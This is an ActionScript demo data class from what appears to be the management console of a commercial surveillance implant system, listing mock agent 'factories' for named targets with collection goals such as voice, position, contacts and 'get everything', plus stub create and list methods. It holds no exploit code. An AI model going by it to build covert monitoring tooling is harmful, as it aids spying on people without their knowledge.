package it.ht.rcs.console.factory.rest
{
  import it.ht.rcs.console.factory.model.Factory;
  import it.ht.rcs.console.operation.model.Operation;
  import it.ht.rcs.console.target.model.Target;
  
  import mx.collections.ArrayCollection;
  import mx.rpc.events.ResultEvent;
  
  public class DBFactoryDemo implements IDBFactory
  {
    public static var factories : ArrayCollection = new ArrayCollection([
      // John Doe (SwordFish)
      new Factory({_id:"4e96ca8bafd50811bc000001", _kind:"factory", desc:"catch all", ident:"RCS_0000000001", counter: 1, name: "John's Laptop Configuration",path :["4df7246d963d350964000001", "4e2683f3963d350658000001"], status: "closed"}),
      new Factory({_id:"4e96ca92afd50811bc000003", _kind:"factory", desc:"voice and position", ident:"RCS_0000000002", counter: 1, name: "John's Mobile Configuration",path :["4df7246d963d350964000001", "4e2683f3963d350658000001"], status: "open"}),
      // Alejandro Reade (Swordfish)
      new Factory({_id:"4e96ca9eafd50811bc000004", _kind:"factory", desc:"documents & contacts", ident:"RCS_0000000003", counter: 1, name: "Alejandro's Setup",path :["4df7246d963d350964000001", "4e2686e1963d350658000002"], status: "open"}),
      // Joey Fargo (SwordFish)
      new Factory({_id:"4e96caafafd50811bc000005", _kind:"factory", desc:"all accessed files", ident:"RCS_0000000004", counter: 2, name: "Joey's Desktop conf",path :["4df7246d963d350964000001", "4e268719963d350658000003"], status: "open"}),
      new Factory({_id:"4e96cabbafd50811bc000006", _kind:"factory", desc:"position and location upon sms", ident:"RCS_0000000005", counter: 1, name: "Joey's Mobile conf",path :["4df7246d963d350964000001", "4e268719963d350658000003"], status: "open"}),
      
      // Guido (BlackJack)
      new Factory({_id:"4e96cac5afd50811bc000007", _kind:"factory", desc:"get everything", ident:"RCS_0000000006", counter: 1, name: "Guido PC setup",path :["4e259fe5963d35425c000001", "4e268724963d350658000004"], status: "open"}),
      new Factory({_id:"4e96cacfafd50811bc000008", _kind:"factory", desc:"contacts & emails", ident:"RCS_0000000007", counter: 1, name: "IPad agent setup for Guido",path :["4e259fe5963d35425c000001", "4e268724963d350658000004"], status: "open"}),
      
      // Dmitry Vitaly (All In)
      new Factory({_id:"4e96cad8afd50811bc000009", _kind:"factory", desc:"eveything ok, watch out for battery levels!!", ident:"RCS_0000000008", counter: 1, name: "Dmitry's mobile conf",path :["4e25a173963d354260000003", "4e26872b963d350658000005"], status: "open"})  
    ]);
    
    public function DBFactoryDemo()
    {
    }
    
    public function all(onResult:Function=null, onFault:Function=null):void
    {
      var event:ResultEvent = new ResultEvent('factory.all', false, true, factories);
      if (onResult != null)
        onResult(event);
    }
    
    public function show(id:String, onResult:Function=null, onFault:Function=null):void
    {
    }
    
    public function create(params:Object, operation:Operation, target:Target, onResult:Function=null, onFault:Function=null):void
    {
      params._id = new Date().getTime().toString();
      
      var factory:Factory = new Factory(params);
      factory.path = [operation._id, target._id];
      factories.addItem(factory);
      
      var event:ResultEvent = new ResultEvent('factory.create', false, true, factory);
      onResult(event);
    }
    
    public function update(factory:Factory, property:Object, onResult:Function=null, onFault:Function=null):void
    {
    }
    
    public function destroy(id:String, onResult:Function=null, onFault:Function=null):void
    {
    }
  }
}